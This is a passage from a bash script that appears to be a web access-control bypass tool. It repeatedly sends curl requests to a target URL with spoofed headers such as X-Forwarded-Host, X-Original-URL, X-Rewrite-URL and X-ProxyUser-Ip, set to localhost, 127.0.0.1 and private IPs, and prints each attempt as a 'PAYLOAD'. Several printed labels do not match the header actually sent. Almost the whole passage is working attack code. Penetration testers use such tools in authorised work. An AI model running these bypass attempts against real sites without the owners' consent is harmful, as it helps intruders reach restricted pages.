	echo -n "X-Forwarded-Host Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Host: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Host: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Host Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Host: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Host: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Host Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Host: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Host: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Host Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Host: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Host: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Host Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Host: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Host: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Host Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Host: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Host: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Host Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Host: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Host: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Host Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Host: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Host: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-Original-URL Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-URL: /${path}" -X GET "${target}/anything" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-URL: /${path}' -X GET '${target}/anything' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-URL Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-URL: /${path}" -X GET "${target}/anything" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-URL: /${path}' -X GET '${target}/anything' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-URL Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-URL: /${path}" -X GET "${target}/anything" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-URL: /${path}' -X GET '${target}/anything' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-URL Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-URL: /${path}" -X GET "${target}/anything" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-URL: /${path}' -X GET '${target}/anything' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-URL Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-URL: /${path}" -X GET "${target}/anything" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-URL: /${path}' -X GET '${target}/anything' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-URL Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-URL: /${path}" -X GET "${target}/anything" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-URL: /${path}' -X GET '${target}/anything' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-URL Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-URL: /${path}" -X GET "${target}/anything" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-URL: /${path}' -X GET '${target}/anything' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-URL Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-URL: /${path}" -X GET "${target}/anything" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-URL: /${path}' -X GET '${target}/anything' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-URL Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-URL: /${path}" -X GET "${target}/anything" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-URL: /${path}' -X GET '${target}/anything' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-URL Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-URL: /${path}" -X GET "${target}/anything" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-URL: /${path}' -X GET '${target}/anything' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-Rewrite-URL Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Rewrite-URL: /${path}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Rewrite-URL: /${path}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Rewrite-URL Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Rewrite-URL: /${path}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Rewrite-URL: /${path}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Rewrite-URL Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Rewrite-URL: /${path}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Rewrite-URL: /${path}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Rewrite-URL Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Rewrite-URL: /${path}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Rewrite-URL: /${path}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Rewrite-URL Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Rewrite-URL: /${path}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Rewrite-URL: /${path}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Rewrite-URL Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Rewrite-URL: /${path}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Rewrite-URL: /${path}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Rewrite-URL Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Rewrite-URL: /${path}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Rewrite-URL: /${path}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Rewrite-URL Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Rewrite-URL: /${path}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Rewrite-URL: /${path}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Rewrite-URL Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Rewrite-URL: /${path}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Rewrite-URL: /${path}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Rewrite-URL Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Rewrite-URL: /${path}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Rewrite-URL: /${path}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "Content-Length Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Content-Length: 0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Content-Length: 0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Content-Length Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Content-Length: 0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Content-Length: 0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Content-Length Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Content-Length: 0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Content-Length: 0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Content-Length Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Content-Length: 0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Content-Length: 0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Content-Length Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Content-Length: 0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Content-Length: 0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Content-Length Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Content-Length: 0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Content-Length: 0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Content-Length Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Content-Length: 0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Content-Length: 0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Content-Length Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Content-Length: 0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Content-Length: 0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Content-Length Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Content-Length: 0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Content-Length: 0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Content-Length Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Content-Length: 0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Content-Length: 0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-ProxyUser-Ip Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-ProxyUser-Ip: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
